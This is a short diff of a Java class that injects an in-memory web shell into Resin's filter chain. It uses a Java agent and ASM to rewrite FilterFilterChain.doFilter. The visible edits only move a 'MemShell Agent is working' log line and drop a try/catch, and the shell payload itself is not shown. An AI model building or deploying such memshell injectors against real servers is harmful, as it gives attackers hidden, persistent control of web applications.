@@ -42,7 +42,6 @@ public class ResinFilterChainAgentInjector implements ClassFileTransformer {
                 inst.retransformClasses(allLoadedClass);
             }
         }
-        System.out.println("MemShell Agent is working at com.caucho.server.dispatch.FilterFilterChain.doFilter");
     }
 
     @Override
@@ -61,6 +60,7 @@ public class ResinFilterChainAgentInjector implements ClassFileTransformer {
                 };
                 ClassVisitor cv = getClassVisitor(cw);
                 cr.accept(cv, ClassReader.EXPAND_FRAMES);
+                System.out.println("MemShell Agent is working at " + TARGET_CLASS.replace("/", ".") + "." + TARGET_METHOD_NAME);
                 return cw.toByteArray();
             } catch (Exception e) {
                 e.printStackTrace();
@@ -77,12 +77,8 @@ public class ResinFilterChainAgentInjector implements ClassFileTransformer {
                                              String signature, String[] exceptions) {
                 MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                 if (TARGET_METHOD_NAME.equals(name)) {
-                    try {
-                        Type[] argumentTypes = Type.getArgumentTypes(descriptor);
-                        return new AgentShellMethodVisitor(mv, argumentTypes, getClassName());
-                    } catch (Exception e) {
-                        e.printStackTrace();
-                    }
+                    Type[] argumentTypes = Type.getArgumentTypes(descriptor);
+                    return new AgentShellMethodVisitor(mv, argumentTypes, getClassName());
                 }
                 return mv;
             }
